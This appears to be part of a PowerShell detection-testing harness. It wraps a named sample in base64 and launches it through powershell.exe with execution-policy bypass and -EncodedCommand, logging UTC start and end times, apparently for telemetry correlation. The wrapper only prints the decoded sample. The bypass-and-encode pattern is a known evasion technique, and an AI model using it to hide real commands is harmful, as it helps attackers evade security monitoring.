$encoded = $samples[$Name]
$wrapper = "`$d=[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$encoded')); Write-Host `$d"
$wrapperEncoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($wrapper))

$startUtc = (Get-Date).ToUniversalTime().ToString("o")
Write-Host "Triggering sample: $Name"
Write-Host "Start UTC: $startUtc"
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $wrapperEncoded | Out-Null
$endUtc = (Get-Date).ToUniversalTime().ToString("o")
Write-Host "Completed sample: $Name"
Write-Host "End UTC: $endUtc"
